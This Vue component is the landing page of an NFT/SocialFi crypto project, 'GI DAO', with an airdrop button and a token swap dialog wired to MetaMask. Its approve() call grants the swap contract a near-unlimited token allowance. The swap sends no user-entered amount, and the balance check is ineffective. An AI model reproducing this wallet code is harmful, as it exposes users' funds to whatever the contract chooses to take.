<template>
  <div class="home">
    <hd @swapCallback="payDialog"></hd>
    <div class="sc-hOGkXu kngXAa"><div class="sc-kHOZwM cEqIAK"></div></div>
    <div class="sc-hOGkXu jqAVIT"><div class="sc-kHOZwM cEqIAK"></div></div>
    <div class="sc-dtMgUX cguGMw">
      <div>
        <h1 class="text-gradient" style="transform: translate(0px, 0px); opacity: 1;">
          The Largest NFT-based SocialFi Metaverse
        </h1>
      </div>
    </div>
    <div class="sc-dkPtRN sc-dlVxhl ehgiey gWMVgc">
      <carousel-3d
        :space="$utils.isMobile()? 'auto':265"
        :width="$utils.isMobile()? 207:360"
        :height="$utils.isMobile()? 207:360"
        :border="0">
        <slide class="banner-item" :index="index" :key="index" v-for="(item, index) in list" :style="{backgroundImage: 'url('+item.src+')'}">
          <div class="sc-fKVqWL ewQnlF">
            <div class="bottom">
              <div class="name">{{item.text}}</div>
              <div class="info">
                <span>FOLLOWERS</span>
                <h2>{{item.price}}</h2>
              </div>
            </div>
          </div>
        </slide>
      </carousel-3d>
    </div>
    <div class="sc-cZMNgc kRZDVl">
      <a
        @click="receive"
        href="javascript:;" class="ant-btn ant-btn-default sc-bdvvtL kpHESW xl discord">
        <span>Receive Airdrop</span>
      </a>
    </div>
    <div class="sc-dkPtRN sc-hKwDye ehgiey kgwayD">
      <div class="sc-bBHxTw dVBiIR">
        <div class="sc-iJKOTD fQyNVY c1">
          <div class="sc-giYglK DawMC">
            <div class="sc-ezbkAF djrmfZ"><h3>Influencers</h3><span>2029</span></div>
            <div class="sc-iwjdpV LzmwB"></div>
            <div class="sc-cxpSdN iZyRee"></div>
            <div class="sc-llYSUQ gAPpKo"></div>
          </div>
        </div>
        <div class="sc-iJKOTD fQyNVY c2">
          <div class="sc-giYglK DawMC">
            <div class="sc-ezbkAF djrmfZ">
              <h3>Countries</h3>
              <span>32</span>
            </div>
            <div class="sc-iwjdpV LzmwB"></div>
            <div class="sc-cxpSdN iZyRee"></div>
            <div class="sc-llYSUQ gAPpKo"></div>
          </div>
        </div>
        <div class="sc-iJKOTD fQyNVY c3">
          <div class="sc-giYglK DawMC">
            <div class="sc-ezbkAF djrmfZ">
              <h3>Followers</h3>
              <span>201M</span>
            </div>
            <div class="sc-iwjdpV LzmwB"></div>
            <div class="sc-cxpSdN iZyRee"></div>
            <div class="sc-llYSUQ gAPpKo"></div>
          </div>
        </div>
      </div>
    </div>
    <section id="dao" class="sc-eCImPb sc-bYoBSM hUyBzy ceykTX">
      <div class="sc-dkPtRN sc-hKwDye ehgiey kgwayD">
        <div class="sc-hiCibw dOzBeC">
          <div class="sc-jJoQJp dddTdF">
            <div>
              <div class="content">
                <div class="" style="transform: translate(0px, 0px); opacity: 1;"><h1 class="sc-gWXbKe cUfCod">Our
                  Story</h1>
                  <p>GI Stands for Global Influencers. The Goal of GI DAO is to get 100k+ influencers onboard to build
                    the largest SocialFi Metaverse and MCN that are fully democratically managed by our community
                    members.</p>
                  <p>We have already signed with 1500+ global influencer.</p>
                  <p>Now it's time to introduce our GI Genesis NFT(GIGN).</p>
                  <p>There are only 10,000 GIGN on blockchain, each GIGN is the highly precious asset which represents
                    lots of utilities and permanent membership of GI community.</p></div>
              </div>
            </div>
          </div>
          <div class="sc-ikJyIC ekhfmr">
            <video muted autoplay="autoplay" loop="loop">
              <source src="../assets/video/cover.mp4" type="video/mp4">
            </video>
            <div class="sc-kLwhqv fSLDMp"></div>
          </div>
        </div>
      </div>
    </section>
    <section id="club" class="sc-eCImPb sc-fWCJzd hUyBzy eQRiwk">
      <div class="sc-dvQaRk hqiubm">
        <div class="sc-TBWPX cmQvZG"></div>
        <div class="sc-jIkXHa cpbFgV">
          <div>
            <div>
              <div class="sc-ZOtfp gCSCtK" style="transform: translate(0px, 0px); opacity: 1;"><h1>Vision</h1>
                <ul>
                  <li>Chapter 1: GI MCN<p>GI MCN is a Web 3.0 revenue-sharing marketing platform that allows brands and
                    global influencers to complete successful collaborations.</p></li>
                  <li>Chapter 2: GI CLUB<p>GI Club is a NFT-based social platform where members can engage social
                    interaction and communication through meaningful experiences and activities.</p></li>
                  <li>Chapter 3: GI NFT Marketplace<p>GI NFT Marketplace is a revolutionary platform that allows global
                    influencers, artists, brands to create and trade a variety of digital artworks and collectibles.</p>
                  </li>
                  <li>Chapter 4: GI Metaverse<p>GI Metaverse is a decentralized virtual reality platform where all
                    community members can create, play, experience in this virtual space.</p></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section id="nft" class="sc-eCImPb sc-jcFjpl hUyBzy bvGsxS">
      <div class="sc-dkPtRN sc-hKwDye ehgiey kgwayD">
        <div class="sc-cidDSM cXhynN">
          <div class="ant-divider ant-divider-horizontal ant-divider-with-text ant-divider-with-text-center" role="separator">
            <span class="ant-divider-inner-text">GI Genesis <br> NFT Utilities</span></div>
        </div>
        <div class="sc-caiLqq cyIjhS">
          <div class="sc-iUKqMP bxjHRN">
            <div>
              <div>
                <div class="sc-cTAqQK dCkSYG" style="transform: translate(0px, 0px); opacity: 1;">
                  <div class="sc-jObWnj jbkEBp">
                    <div class="sc-iAKWXU bEGLYH"></div>
                  </div>
                  <div class="sc-efQSVx gaBBTL"><img src="../assets/img/icon-token.png" alt="">
                  </div>
                  <h2>GI DAO Token</h2>
                  <p>Airdrops of 13% GI Token</p>
                  <p>Early rewards of GI Token</p>
                  <p>Stake NFT to get GI Token rewards</p></div>
              </div>
            </div>
          </div>
          <div class="sc-iUKqMP bxjHRN">
            <div>
              <div>
                <div class="sc-cTAqQK dCkSYG" style="transform: translate(0px, 0px); opacity: 1;">
                  <div class="sc-jObWnj jbkEBp">
                    <div class="sc-iAKWXU bEGLYH"></div>
                  </div>
                  <div class="sc-efQSVx gaBBTL"><img src="../assets/img/icon-club.png" alt="">
                  </div>
                  <h2>Membership of GI CLUB</h2>
                  <p>Regular scheduled activities in real world</p>
                  <p>Online social and networking events</p>
                  <p>Private Yacht &amp; Mansion parties</p></div>
              </div>
            </div>
          </div>
          <div class="sc-iUKqMP bxjHRN">
            <div>
              <div>
                <div class="sc-cTAqQK dCkSYG" style="transform: translate(0px, 0px); opacity: 1;">
                  <div class="sc-jObWnj jbkEBp">
                    <div class="sc-iAKWXU bEGLYH"></div>
                  </div>
                  <div class="sc-efQSVx gaBBTL">
                    <img src="../assets/img/icon-privileges.png" alt=""></div>
                  <h2>Exclusive Privileges</h2>
                  <p>Exclusive invite-only influencer events</p>
                  <p>Exclusive Perks in activities</p>
                  <p>VIP groups with some influencers</p></div>
              </div>
            </div>
          </div>
          <div class="sc-iUKqMP bxjHRN">
            <div>
              <div>
                <div class="sc-cTAqQK dCkSYG" style="transform: translate(0px, 0px); opacity: 1;">
                  <div class="sc-jObWnj jbkEBp">
                    <div class="sc-iAKWXU bEGLYH"></div>
                  </div>
                  <div class="sc-efQSVx gaBBTL"><img src="../assets/img/icon-access.png" alt="">
                  </div>
                  <h2>Early Access</h2>
                  <p>Presale Allocation of GI Launchpad</p>
                  <p>Free Mint Opportunities in GI NFT Marketplace</p>
                  <p>Free NFT assets in GI Metaverse</p></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section id="roadmap" class="sc-eCImPb sc-ehCJOs hUyBzy jEhfby">
      <div class="sc-cidDSM cXhynN">
        <div class="ant-divider ant-divider-horizontal ant-divider-with-text ant-divider-with-text-center" role="separator">
          <span class="ant-divider-inner-text">Roadmap</span></div>
      </div>
      <div class="sc-lcepkR gluNBM">
        <div class="sc-Galmp gzDmYm released">
          <div class="sc-gGCDDS etELgo"></div>
          <div class="sc-clIzBv QmIqi">
            <div class="sc-faUpoM jdhGZv">Q1, 2022</div>
            <h2>Phase 1 : GI MCN</h2>
            <ul>
              <li>Raise $1.2 million in Pre-Seed Round</li>
              <li>Onboarding of 1,000+ Influencers</li>
              <li>Website Completion</li>
            </ul>
          </div>
        </div>
        <div class="sc-Galmp gzDmYm">
          <div class="sc-gGCDDS etELgo"></div>
          <div class="sc-clIzBv QmIqi">
            <div class="sc-faUpoM jdhGZv">Q2, 2022</div>
            <h2>Phase 2 : GI CLUB</h2>
            <ul>
              <li>Set up GI CLUB HQ in Singapore</li>
            </ul>
            <p>GI CLUB Member Exclusive Social Activities</p>
            <ul class="list">
              <li>Johor Bahru: 02nd April, R&amp;F Marina Club</li>
              <li>Singapore: 09th May, Sentosa Golf Club</li>
              <li>Dubai: 28th June, Cooz in Grand Hyatt</li>
              <li>Miami: 18th July, LIV Miami</li>
            </ul>
            <h2>Phase 3: GI Founder Pass</h2>
            <ul>
              <li>Total Supply: 1,000</li>
              <li>Mint Date: <b>April 27, 2022</b></li>
            </ul>
            <h2>Phase 4: GI Genesis NFT</h2>
            <ul>
              <li>Genesis NFT Presale / Public Sale</li>
              <li>Onboarding of 3,000+ Influencers</li>
              <li>GI CLUB Community Building and Growth</li>
              <li>Set up 10+ GI CLUB Branches Globally</li>
            </ul>
          </div>
        </div>
        <div class="sc-Galmp gzDmYm">
          <div class="sc-gGCDDS etELgo"></div>
          <div class="sc-clIzBv QmIqi">
            <div class="sc-faUpoM jdhGZv">Q3, 2022</div>
            <h2>Phase 5: GI NFT Marketplace</h2>
            <ul>
              <li>Onboarding of 5,000+ Influencers</li>
              <li>Launch of GI Influencers' NFT Marketplace</li>
            </ul>
            <h2>Phase 6 : GI Token and GI DAO</h2>
            <ul>
              <li>GI Token Presale/ Publice Sale</li>
              <li>GI Token Airdrops</li>
              <li>GI Token DEX/CEXs Listing</li>
              <li>Launch of GI DAO</li>
              <li>Launch of GI DAO Treasury</li>
              <li>Launch of On-Chain Governance</li>
              <li>Set up 20+ GI CLUB Branches Globally</li>
            </ul>
          </div>
        </div>
        <div class="sc-Galmp gzDmYm">
          <div class="sc-gGCDDS etELgo"></div>
          <div class="sc-clIzBv QmIqi">
            <div class="sc-faUpoM jdhGZv">Q4, 2022</div>
            <h2>Phase 7: GI Metaverse</h2>
            <ul>
              <li>Onboarding of 10,000+ influencers</li>
              <li>Launch of GI Metaverse Dapp</li>
              <li>Set up Metaverse HQ in Sandbox/Decentraland</li>
              <li>Set up 40+ GI CLUB Branches Globally</li>
            </ul>
          </div>
        </div>
        <div class="sc-Galmp gzDmYm">
          <div class="sc-gGCDDS etELgo"></div>
          <div class="sc-clIzBv QmIqi">
            <div class="sc-faUpoM jdhGZv">To be announced</div>
          </div>
        </div>
      </div>
    </section>
    <section id="explore" class="sc-eCImPb hUyBzy">
      <div class="sc-cidDSM cXhynN sc-gSQFLo iZQPsH">
        <div class="ant-divider ant-divider-horizontal ant-divider-with-text ant-divider-with-text-center" role="separator">
          <span class="ant-divider-inner-text">GI DAO <br>Influencers</span></div>
      </div>
      <div class="sc-dkPtRN sc-hKwDye ehgiey kgwayD">
        <div class="sc-iNGGcK kKXojf">
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/ssab.breenaa/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240247329.png?x-oss-process=image/resize,w_300" alt="" class="pentagon">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Nur Sabrina</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/_lynnnnn1314/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240752896.png?x-oss-process=image/resize,w_300" alt="" class="hexagon">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Lynn</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/yumi.yx/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240274189.png?x-oss-process=image/resize,w_300" alt="" class="hexagon">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Yumi.yx</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/k_y_o_n_a/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240530696.png?x-oss-process=image/resize,w_300" alt="" class="hexagon">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Kyona</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/baeebbaeeee/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240483331.png?x-oss-process=image/resize,w_300" alt="" class="hexagon">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Baee</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/scarlette_soh/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240312329.png?x-oss-process=image/resize,w_300" alt="" class="trapezoid">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Scarlette soh</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/madiigles/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240253128.png?x-oss-process=image/resize,w_300" alt="" class="circle">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Madi</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/farahzulaikhaaa/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240759780.png?x-oss-process=image/resize,w_300" alt="" class="pentagon">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Farah Zulaiki</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/angelathenalow/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240704725.png?x-oss-process=image/resize,w_300" alt="" class="trapezoid">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Angel</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/mavis_c28/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240509704.png?x-oss-process=image/resize,w_300" alt="" class="circle">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Mavis</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/yunis_to/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240304713.png?x-oss-process=image/resize,w_300" alt="" class="trapezoid">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Yunis</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
          <div class="sc-hiwPVj gjkNax"><a href="https://www.instagram.com/tiffanylee_4134/" target="_blank">
            <div class="sc-nVkyK hdimVu">
              <img src="https://media.gidao.io/1647240675999.png?x-oss-process=image/resize,w_300" alt="" class="pentagon">
              <div class="sc-eJwWfJ kvwJqS"><span>SEE MORE</span></div>
            </div>
            <h2>Tiffany</h2>
            <div class="sc-jeraig bYmqcv"></div>
          </a></div>
        </div>
        <div class="sc-lbhJGD MfBbB">
          <button type="button" class="ant-btn ant-btn-default sc-bdvvtL kpHESW xl"><a target="_blank" href="https://gidao.io/gallery">SEE ALL</a>
          </button>
        </div>
      </div>
    </section>
    <ft></ft>

      <div class="mint-dialog animated" v-show="visible">
        <div class="container-1">
          <div class="dialog-view">
            <div class="dialog-title">
              Swap
              <a
                href="javascript:;"
                class="common-close">
                <img src="@/assets/img/close.svg" @click="visible = false">
              </a>
            </div>
            <div class="dialog-content">
              <div class="balance">Balance：{{balance}}</div>
              <div class="input-content">
                <div class="input-container">
                  <div class="input-row">
                    <input
                      @blur="blur($event)"
                      v-model.trim="price"
                      class="input-price"
                      autocomplete="off"
                      type="text"
                      placeholder="0.0"
                      v-on:input="formatDecimal">
                    <span class="icon-main">
                    <span class="icon-row">
                      <div class="icon-box">
<!--                        <img class="currency-img" alt="USDT logo" src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" style="margin-right: 0.5rem;">-->
                        <span class="text">GI</span>
                      </div>
                    </span>
                  </span>
                  </div>
                </div>
              </div>
            </div>
            <div class="justify-between flex bold mt-20">
              <span class="label">Price</span>
              <span class="value">0.015444 GI per USDT</span>
            </div>
            <div class="justify-between flex bold mt-20">
              <span class="label">Slippage Tolerance</span>
              <span class="value">0.5%</span>
            </div>
            <div class="dialog-footer">
              <a
                v-if="!isApprove"
                @click="approve"
                href="javascript:;"
                class="common-button button-48 button-primary">Approve
              </a>
              <a
                @click="swapPay"
                href="javascript:;"
                :class="isApprove? 'button-ok':'button-disabled'"
                class="common-button button-48">Swap
              </a>
            </div>
          </div>
        </div>
      </div>
    <v-overlay z-index="999" :value="overlay">
      <v-progress-circular
        indeterminate
        size="64"
      ></v-progress-circular>
    </v-overlay>
  </div>
</template>
<script>
import {fetchList} from '@/api/common'
import {connectNetwork} from '@/utils/getWeb3'
import {getBalance} from "@/utils/common"
import hd from '@/components/header'
import ft from '@/components/footer'

export default {
  name: 'Home',
  components: {
    hd,
    ft
  },
  data() {
    this.list = [
      {
        src: require('@/assets/img/index01.jpg'),
        text: '@amberna_official',
        price: '2,780,000'
      },
      {
        src: require('@/assets/img/index02.jpg'),
        text: '@jazmin_z7',
        price: '152,000'
      },
      {
        src: require('@/assets/img/index033.jpg'),
        text: '@serene_serenity',
        price: '257,000'
      },
      {
        src: require('@/assets/img/index03.jpg'),
        text: '@yumi.yx',
        price: '58,000'
      },
      {
        src: require('@/assets/img/index04.jpg'),
        text: '@joey_sih',
        price: '54,000'
      },
      {
        src: require('@/assets/img/index05.jpg'),
        text: '@qingrui_chan',
        price: '92,000'
      },
      {
        src: require('@/assets/img/index07.jpg'),
        text: '@k_y_o_n_a',
        price: '54,000'
      },
      {
        src: require('@/assets/img/index11.jpg'),
        text: '@madiigles',
        price: '52,000'
      },
      {
        src: require('@/assets/img/index06.jpg'),
        text: '@huisunpang33',
        price: '557,000'
      }
    ]
    return {
      price: '',
      visible: false,
      overlay: false,
      isApprove: false,
    }
  },
  computed: {
    balance() {
      return this.$store.state.balance
    },
    web3Register() {
      return this.$store.state.web3Register
    }
  },
  watch: {
    web3Register (newval, old) {
      if (newval.accounts) {
        this.getAllowance()
        this.$utils.getBalance(newval.accounts)
        // this.fnGetBalance(newval.accounts)
      }
      if (newval.isLogin) {
        this.$msg({message: 'Wallet connected successfully', type: 'success'})
      }
    }
  },
  mounted () {
    this.getAllowance()
  },
  methods: {
    payDialog() {
      if (this.web3Register.isLogin) {
        this.visible = true
      } else {
        this.$msg({message: 'Please Connect Wallet', type: 'warning'})
      }
    },
    swapPay() {
      if (!this.price || this.price === '0') {
        return this.$msg({message: 'Please enter the amount', type: 'warning'})
      }
      if (Number(this.balance) < 0) {
        return this.$msg({message: 'Insufficient GI balance', type: 'warning'})
      }
      const {contract, swap_abi} = this.$config
      const _contract = new this.$metaMaSKWeb3.eth.Contract(swap_abi, contract.swap_contract)
      _contract.methods.swapCoin().send({from: this.web3Register.accounts}).then(res => {
        if (res.status) {
          this.$msg({message: 'Exchange Succeeded', type: 'success'})
        }
      }).catch(err => {
        this.$msg({message: 'Exchange Cancellation', type: 'error'})
      })
    },
    blur($event) {
      let str = $event.target.value
      let lastStr = str.slice(str.length - 1)
      if (lastStr === '.') {
        str = str.slice(0, -1)
      }
      this.price = str
    },
    receive() {
      if (!this.web3Register.isLogin) {
        return this.$msg({message: 'Please Connect Wallet', type: 'warning'})
      }
      let token = '0x0000000000000000000000000000000000000000'
      const ref = this.$route.query.ref
      if (ref && this.$metaMaSKWeb3.utils.isAddress(ref)) {
        token = ref
      }
      const {contract, swap_abi} = this.$config
      const _contract = new this.$metaMaSKWeb3.eth.Contract(swap_abi, contract.swap_contract)
      _contract.methods.mint(token).send({from: this.web3Register.accounts}).then(res => {
        if (res.status) {
          this.$msg({message: 'Received Successfully', type: 'success'})
        }
      }).catch(err => {
        this.$msg({message: 'Failed to get it, Please get it again', type: 'error'})
      })
    },
    approve() {
      const {contract, symbol_abi} = this.$config
      const _contract = new this.$metaMaSKWeb3.eth.Contract(symbol_abi, contract.symbol_contract)
      return new Promise((resolve, reject) => {
        const sum = this.$metaMaSKWeb3.utils.toWei(String(10000000000), 'ether')
        this.overlay = true
        _contract.methods.approve(contract.swap_contract, sum).send({
            from: this.web3Register.accounts,
        }).then(res => {
          this.overlay = false
          if (res.status) {
            this.isApprove = true
            this.$msg({message: 'Authorization Succeeded', type: 'success'})
          }
        }).catch((err) => {
          this.overlay = false
          this.$msg({message: 'Cancel Authorization', type: 'error'})
         console.log(err)
        })
      })
    },
    getAllowance (item) {
      if (this.web3Register.accounts) {
        const {contract, symbol_abi} = this.$config
        const _contract = new this.$metaMaSKWeb3.eth.Contract(symbol_abi, contract.symbol_contract)
        _contract.methods.allowance(this.web3Register.accounts, contract.swap_contract).call((err, result) => {
          if (err) return
          if (Number(this.$metaMaSKWeb3.utils.fromWei(result, 'ether')) > 0) {
            this.isApprove = true
          }
        })
      }
    },
    formatDecimal () {
      let number = this.price
      number = number.replace(/[^\d.]/g,'')
      number = number.replace(/^\./g,'')
      number = number.replace(/\.{2,}/g,'.')
      number = number.replace('.','$#$').replace(/\./g,'').replace('$#$','.')
      number = number.replace(/^(\-)*(\d+)\.(\d\d\d\d).*$/,'$1$2.$3')
      if (number.indexOf('.') < 0 && number != '') {
        number = parseFloat(number)
      }
      if (number > 9999999999) {
        this.price =  String(number).substr(0, 10)
      } else {
        this.price = number
      }
    }
  }
}
</script>
<style scoped lang="scss">

</style>
